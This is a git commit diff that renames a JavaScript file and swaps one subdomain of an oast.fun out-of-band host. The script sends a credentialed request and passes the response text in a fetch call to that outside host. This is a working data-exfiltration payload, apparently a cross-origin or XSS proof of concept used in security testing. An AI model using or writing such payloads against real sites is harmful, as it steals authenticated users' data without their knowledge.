6c6f3b66d45007cfd0a7a821a94fc9d2efacac28
monixxxx <92028136+monixxxx@users.noreply.github.com>
2023-07-30 01:04:00 +0300

    Update and rename cxx.js to cxxx.js

--- cxxx.js
+++ cxxx.js
@@ -5,5 +5,5 @@ req.withCredentials = true;
 req.send();
 
 function reqListener() {
-    fetch(('https://ck2p4402vtc0000wswwggjtmnnyyyyyyb.oast.fun/?xxx='+this.responseText))
+    fetch(('https://ck2p4402vtc0000wswwggjtmntyyyyyyn.oast.fun/?xxx='+this.responseText))
 };
